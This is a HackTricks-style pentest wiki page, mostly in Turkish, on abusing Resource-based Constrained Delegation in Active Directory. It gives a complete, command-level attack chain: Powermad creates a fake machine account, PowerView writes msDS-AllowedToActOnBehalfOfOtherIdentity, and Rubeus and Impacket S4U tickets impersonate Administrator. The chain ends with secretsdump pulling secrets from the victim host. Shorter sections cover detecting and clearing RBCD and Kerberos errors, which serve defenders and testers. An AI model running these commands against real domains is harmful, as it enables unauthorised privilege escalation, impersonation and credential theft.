# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerdir ancak **bir nesneye** bir **makineye karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Resource-based Constrain Delegation **nesnenin kimin adına herhangi bir kullanıcıyı taklit edebileceğini belirler**.

Bu durumda kısıtlı nesnenin, ona karşı herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir özniteliği olur.

Bu Constrained Delegation ile diğer delegation türleri arasındaki bir diğer önemli fark ise, herhangi bir kullanıcının **bir machine hesabı üzerinde write izinlerine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) sahip olması durumunda **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (Diğer delegation türlerinde domain admin ayrıcalıkları gerekiyordu).

### New Concepts

Constrained Delegation'da, bir kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerektiği söyleniyordu. Ancak bu tamamen doğru değil.\
Gerçek şu ki, o değer olmasa bile eğer bir **service** iseniz (SPN'e sahipseniz) herhangi bir kullanıcıya karşı **S4U2Self** yapabilirsiniz; fakat eğer **`TrustedToAuthForDelegation`** varsa dönen TGS **Forwardable** olur, yoksa dönen TGS **Forwardable** olmaz.

Ancak **S4U2Proxy**'de kullanılan **TGS** **NOT Forwardable** ise, temel bir **Constrain Delegation**'ı kötüye kullanmaya çalışmak **çalışmaz**. Fakat bir **Resource-Based constrain delegation**'ı istismar etmeye çalışıyorsanız, bu durumda çalışacaktır.

### Attack structure

> Eğer bir **Computer** hesabı üzerinde **write equivalent privileges**'a sahipseniz, o makinede **ayrıcalıklı erişim** elde edebilirsiniz.

Varsayalım ki saldırgan zaten **write equivalent privileges over the victim computer**'a sahip.

1. Saldırgan **SPN**'i olan bir hesabı **compromises** eder veya **yeni bir tane oluşturur** (“Service A”). Unutmayın, ek bir ayrıcalık olmadan **herhangi bir** _Admin User_ en fazla 10 Computer nesnesi (**_MachineAccountQuota_**) oluşturabilir ve onlara **SPN** atayabilir. Yani saldırgan bir Computer nesnesi oluşturup ona SPN atayabilir.
2. Saldırgan kurban bilgisayar (ServiceB) üzerindeki WRITE yetkisini kullanarak **resource-based constrained delegation** yapılandırır ve ServiceA'nın o kurban bilgisayara karşı herhangi bir kullanıcıyı taklit etmesine izin verir (ServiceB).
3. Saldırgan Rubeus'u kullanarak Service A'dan Service B'ye, Service B'ye **ayrıcalıklı erişimi** olan bir kullanıcı için **full S4U attack** (S4U2Self ve S4U2Proxy) gerçekleştirir.
1. S4U2Self (ele geçirilmiş/oluşturulmuş SPN hesabından): Kendime **TGS of Administrator to me** ister (Not Forwardable).
2. S4U2Proxy: Bir önceki adımdaki **not Forwardable TGS**'i kullanarak **Administrator**'dan **victim host**'a bir **TGS** ister.
3. Not Forwardable TGS kullanıyor olsanız bile, Resource-based constrained delegation'ı istismar ettiğiniz için bu işlem çalışır.
4. Saldırgan **pass-the-ticket** yapabilir ve kullanıcıyı **impersonate** ederek kurban ServiceB'ye **erişim** elde edebilir.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bilgisayar Nesnesi Oluşturma

Etki alanı içinde bir bilgisayar nesnesi oluşturmak için **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kaynak Tabanlı Kısıtlı Delegasyonun Yapılandırılması

**Kullanarak activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview Kullanımı**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U attack gerçekleştirme (Windows/Rubeus)

İlk olarak, yeni Computer nesnesini `123456` parolasıyla oluşturduk, bu yüzden o parolanın hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 ve AES hashes'lerini yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak bir kerede daha fazla servis için daha fazla ticket oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Cannot be delegated**" adlı bir özniteliğe sahip olduğunu unutmayın. Bir kullanıcının bu özniteliği True ise, onu taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux üzerinde çalışıyorsanız, resmi Impacket araçlarını kullanarak tam RBCD zincirini gerçekleştirebilirsiniz:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP signing/LDAPS zorunluysa, `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus her ikisi de yalnızca AES akışlarını destekler.
- Impacket bazı araçlar için `sname` ("AnySPN") değerini yeniden yazabilir, ancak mümkün olduğunda doğru SPN'i edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Erişim

Son komut satırı **tam S4U saldırısını gerçekleştirecek ve Administrator'dan hedef host'a TGS'yi enjekte edecektir** **bellekte**.\
Bu örnekte Administrator'dan **CIFS** servisi için bir TGS istendi, bu yüzden **C$**'e erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı servis ticket'larını kötüye kullanma

Detaylar için bakın: [**available service tickets here**](silver-ticket.md#available-services).

## Keşfetme, denetleme ve temizleme

### RBCD yapılandırılmış bilgisayarları keşfetme

PowerShell (SD'yi çözerek SID'leri çözümleme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (tek komutla oku veya boşalt):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD'yi temizleme / sıfırlama

- PowerShell (özniteliği temizle):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'ün DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve sizin yalnızca RC4 hash'i verdiğiniz anlamına gelir. Rubeus'a en az AES256 hash'ini verin (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saatinin farklı olduğu ve kerberos'ün düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bu şu anlama gelebilir:
- Deneklemek istediğiniz kullanıcı hedef servise erişemiyor (çünkü onu taklit edemiyorsunuz veya yeterli ayrıcalığı yok)
- İstenen servis mevcut değil (örneğin winrm için ticket istiyorsunuz ama winrm çalışmıyor)
- Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve bunları geri vermeniz gerekir.
- Klasik KCD'yi kötüye kullanıyor olabilirsiniz; unutmayın RBCD, non-forwardable S4U2Self ticket'ları ile çalışır, KCD ise forwardable gerektirir.

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bakınız:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay zincirleri genelde tek adımda local SYSTEM elde etmek için RBCD ile biter. Sondan sona pratik örnekler için bakınız:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Eğer LDAP signing/channel binding **devre dışı** ise ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanan bir Kerberos kimlik doğrulamasını LDAP'a relay edebilir, hedef bilgisayar nesnesinde machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini ayarlayabilir ve off-host S4U ile hemen **Administrator**'ı taklit edebilir.

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
